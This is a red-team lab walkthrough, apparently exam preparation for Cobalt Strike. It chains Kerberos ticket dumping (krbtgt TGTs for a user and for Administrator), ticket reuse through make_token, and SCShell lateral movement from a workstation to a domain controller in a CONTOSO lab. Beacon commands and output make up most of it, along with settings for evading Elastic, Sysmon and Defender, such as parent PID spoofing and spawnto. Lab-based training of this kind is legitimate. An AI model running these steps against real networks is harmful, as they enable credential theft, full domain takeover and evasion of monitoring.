# Lateral Movement Lab

>The objective of this lab is to impersonate a user/administrator and move laterally using SCShell to jump to another target🖥️.

1. Launch Cobalt Strike and connect to the team server.

## User Impersonation

* Impersonate the rsteel user. [User Impersonate Lab](/labs/User-Impersonation-lab.md)  


⚠️ Load Kerbeus-BOF aggressor script if not already loaded:
```
CS → Cobalt Strike → Script Manager → Load → C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
```

```cs
ps
krb_triage
```

Look and dump for user: `rsteel @ CONTOSO.COM | krbtgt/CONTOSO.COM`  

```cs
krb_dump /user:rsteel /service:krbtgt
```

* Save kirbi to attacker desktop

>Copy base64 value and paste to PowerShell command on attacker desktop PowerShell:

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("<paste-base64-here>"))
```

>Create sacrificial logon session  

```cs
make_token CONTOSO\rsteel FakePass

kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi

powerpick klist
```

>Check Access remote smb resource

```cs
ls \\lon-ws-1\c$
ls \\lon-dc-1\c$
```

----  

⚠️ Use Credential Access and User Impersonation method to impersonate user/administrator.  

## Lateral Movement JUMP to Web Server  

1. Load the SCShell Aggressor script.
    1. Go to **Cobalt Strike > Script Manager**.
    2. Click **Load**.
    3. Select `C:\Tools\SCShell\CS-BOF\scshell.cna`.

1. SCShell uses the service binary payload, so make sure to set the spawnto first.
    1. `ak-settings spawnto_x64 C:\Windows\System32\svchost.exe`

1. Move laterally to `lon-ws-1` 🖥️  
  1. `jump scshell64 lon-ws-1 smb`
  
⚠️ A new SYSTEM Beacon appear `lon-ws-1`
    Ignore errors, Advapi32$StartServiceA failed to start the service. 1056  
    SCshell does not attempt to stop the service first (it assumes it's already stopped).  
    💡 wait a few minutes and Retry again💡  

## Lateral Movement JUMP to Domain Controller

>Execute on new web server `lon-ws-1` server beacon   
>Establish situation awareness, beacon first commands!  

```
getuid
ps
sleep 3 20
ppid 432
spawnto x64 %windir%\sysnative\werfault.exe
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe

krb_triage
```

>Beacon received output:  

```
Action: List Kerberos Tickets (All Users)
--------------------------------------------------------------------------------------------------------------------------
| LUID        | Client                                   | Service                                  |            End Time |
--------------------------------------------------------------------------------------------------------------------------
| 0:0x15e244  | rsteel @ CONTOSO.COM                     | cifs/lon-ws-1                            | 27.04.2026 23:02:04 |
| 0:0x77626   | Administrator @ CONTOSO.COM              | krbtgt/CONTOSO.COM                       | 27.04.2026 22:58:52 |
| 0:0x77626   | Administrator @ CONTOSO.COM              | LDAP/lon-dc-1.contoso.com/contoso.com    | 27.04.2026 22:58:52 |
| 0:0x3e4     | lon-ws-1$ @ CONTOSO.COM                  | krbtgt/CONTOSO.COM                       | 27.04.2026 22:58:51 |
| 0:0x3e4     | lon-ws-1$ @ CONTOSO.COM                  | krbtgt/CONTOSO.COM                       | 27.04.2026 22:58:51 |
| 0:0x3e4     | lon-ws-1$ @ CONTOSO.COM                  | cifs/lon-dc-1.contoso.com                | 27.04.2026 22:58:51 |
| 0:0x3e7     | lon-ws-1$ @ CONTOSO.COM                  | krbtgt/CONTOSO.COM                       | 27.04.2026 22:59:45 |
| 0:0x3e7     | lon-ws-1$ @ CONTOSO.COM                  | krbtgt/CONTOSO.COM                       | 27.04.2026 22:59:45 |
| 0:0x3e7     | lon-ws-1$ @ CONTOSO.COM                  | ldap/lon-dc-1.contoso.com                | 27.04.2026 22:59:45 |
| 0:0x3e7     | lon-ws-1$ @ CONTOSO.COM                  | cifs/lon-dc-1.contoso.com/contoso.com    | 27.04.2026 22:59:45 |
| 0:0x3e7     | lon-ws-1$ @ CONTOSO.COM                  | LON-WS-1$                                | 27.04.2026 22:59:45 |
| 0:0x3e7     | lon-ws-1$ @ CONTOSO.COM                  | LDAP/lon-dc-1.contoso.com/contoso.com    | 27.04.2026 22:59:45 |
--------------------------------------------------------------------------------------------------------------------------
```

### Impersonate Administrator on Web Server

```
krb_dump /user:Administrator /service:krbtgt
```

>Copy base64 ticket value for administrator to PowerShell command to save kirbi file:

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<base64-ticket-administrator>"))
```

>Use ticket file  

```
kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi

ldapsearch (objectClass=computer) --attributes name,operatingSystem,dNSHostName
ls \\lon-dc-1\c$
```

>Beacon Output:  

```
[04/27 13:27:58] [*] Listing: \\lon-dc-1\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 13:33:39   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     05/08/2021 08:20:24   PerfLogs
          dir     04/11/2025 12:01:00   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     04/27/2026 12:58:40   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/29/2025 10:42:20   System Volume Information
          dir     01/24/2025 13:33:21   Users
          dir     04/11/2025 10:54:00   Windows
 12kb     fil     04/27/2026 05:57:32   DumpStack.log.tmp
 1gb      fil     04/27/2026 05:57:32   pagefile.sys
```

⚠️ Use Credential Access and User Impersonation method to impersonate user/administrator.  

## Lateral Movement JUMP to Domain Controller    

>On Web server with administrator TGT beacon but the jump originated from LON-WS-1:  

```
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump scshell64 lon-dc-1 smb
```

### Domain Controller Access  

>After new beacon appear, interact on new `lon-dc-1` beacon:  

```bash
getuid
shell hostname # OPSEC-🔴UNSAFE
ls c:\
```

⚠️ In this lab, you have learned how to chain credential access, user impersonation, and a lateral movement technique together.

----

## 🛡️EDR Stack Present in CRTO EXAM    

| Process | Role |
|---------|------|
| `elastic-agent.exe` | Elastic EDR agent🚨 |
| `elastic-endpoint.exe` | Elastic endpoint protection⛔ |
| `Sysmon64.exe` | Process/network/pipe telemetry📡 |
| `MsMpEng.exe` | Windows Defender⛔ |
| `NisSrv.exe` | Defender Network Inspection❗ |

Every process spawn, named pipe, and 🖥️network connection is logged. `ppid` + `spawnto` +
custom `post-ex.pipename` in the malleable profile are **required**, not optional.
